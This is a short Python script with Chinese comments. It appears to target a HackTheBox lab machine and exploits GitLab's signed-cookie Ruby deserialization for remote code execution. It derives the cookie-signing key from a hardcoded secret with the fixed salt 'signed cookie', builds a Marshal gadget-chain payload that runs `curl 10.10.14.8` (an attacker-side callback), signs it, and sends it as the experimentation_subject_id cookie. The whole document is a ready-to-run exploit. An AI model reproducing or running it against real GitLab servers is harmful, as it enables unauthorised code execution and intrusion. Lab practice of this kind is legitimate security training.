from hashlib import pbkdf2_hmac,sha1
import base64
import hmac
import requests
import urllib3
urllib3.disable_warnings()
#经过加盐的key
key = pbkdf2_hmac(
    hash_name = 'sha1', 
    password = b"3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3", 
    salt = b"signed cookie", #这个盐是gitlab里面固定的值
    iterations = 1000, 
    dklen = 64
)
#经过序列化的payload
code='\x04\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0e@instanceo:\x08ERB\x08:\t@srcI"\x16`curl 10.10.14.8`\x06:\x06ET:\x0e@filenameI"\x061\x06;\tT:\x0c@linenoi\x06:\x0c@method:\x0bresult:\t@varI"\x0c@result\x06;\tT:\x10@deprecatorIu:\x1fActiveSupport::Deprecation\x00\x06;\tT'
#生成签名
cookie_signature = hmac.new(key, base64.b64encode(code), sha1)
payload =base64.b64encode(code)+'--'+cookie_signature.hexdigest()
#发起攻击
cookies = {'experimentation_subject_id':payload}
res = requests.get("https://git.laboratory.htb/users/sign_in",cookies=cookies,verify=False)
print res.status_code
